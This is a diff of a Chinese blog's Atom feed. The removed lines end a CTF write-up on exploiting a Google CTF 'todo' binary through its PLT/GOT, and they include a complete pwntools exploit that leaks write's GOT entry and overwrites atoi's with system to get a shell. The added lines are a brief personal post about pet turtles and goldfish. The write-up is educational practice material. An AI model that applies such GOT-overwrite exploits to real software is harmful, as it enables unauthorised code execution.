-&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;Q&lt;/code&gt; 是指定按照小端序读取 8 个字节作为一个数字。因为这时候 write 函数还没有被解析，所以 got 表中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 还是指向 &lt;code class=&quot;highlighter-rouge&quot;&gt;write@plt+6&lt;/code&gt; 的。&lt;/p&gt;
-
-&lt;p&gt;剩下的步骤就简单多了，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;store_todo&lt;/code&gt; 函数中，可以将我们的输入写入 got 表的位置，所以应该是将 &lt;code class=&quot;highlighter-rouge&quot;&gt;system@plt&lt;/code&gt; 的地址写入接下来要运行的参数可控的函数的 got 表的位置。发现 &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi&lt;/code&gt; 函数是一个选择，函数的偏移是确定的，&lt;code class=&quot;highlighter-rouge&quot;&gt;system@plt&lt;/code&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;write@plt+6&lt;/code&gt; 也就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x555555554940 - 0x555555554916 = 0x2a&lt;/code&gt;（&lt;code class=&quot;highlighter-rouge&quot;&gt;atoi@plt&lt;/code&gt; 的地址可以使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;info addr atoi@plt&lt;/code&gt; 获取，是在偏移 -4 再加 8 个字节）。&lt;/p&gt;
-
-&lt;p&gt;完整 exp 如下&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./todo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;read?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hi admin,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;entry?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TODO?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;参考&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;https://hackso.me/google-ctf-beginners-quest-part-2/&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>virusdefender</name></author><category term="安全" /><category term="CTF" /><summary type="html">本文是 plt 和 got 表相关的漏洞利用实例，是 Google CTF 中的一道题，题目给了源码和 binary。</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="生活" /><summary type="html">前几个月妹子买了两只小龟，是密西西比红耳龟，国内一般称巴西龟，淘宝上小苗子一般几块钱一只。我之后又买了一些草金鱼，一开始是 20 多条，除去陆续死掉的和看样子不大行喂了龟的，现在还剩一半，已经一段时间没有死过了。</summary></entry></feed>
